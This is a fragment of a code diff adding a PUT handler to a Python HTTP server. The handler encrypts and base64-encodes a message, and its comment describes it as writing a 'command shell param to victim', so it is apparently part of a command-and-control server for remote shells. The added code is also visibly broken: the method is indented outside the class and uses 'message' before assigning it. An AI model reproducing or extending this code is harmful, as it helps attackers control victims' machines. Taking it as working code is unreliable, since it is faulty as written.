@@ -79,6 +79,22 @@ class GetHandler(BaseHTTPRequestHandler):
         # return out
         return
 
+# handle put request
+def do_PUT(self):
+  # send a 200 OK response
+  self.send_response(200)
+  #sets header
+  self.set_headers()
+
+  # encrypt the message
+  message = EncodeAES(cipher, message)
+  # base64 it
+  message = base64.b64encode(message)
+  # write our command shell param to victim
+  self.wfile.write(message)
+  # return out
+  return
+    
     # handle post request
     def do_POST(self):
 
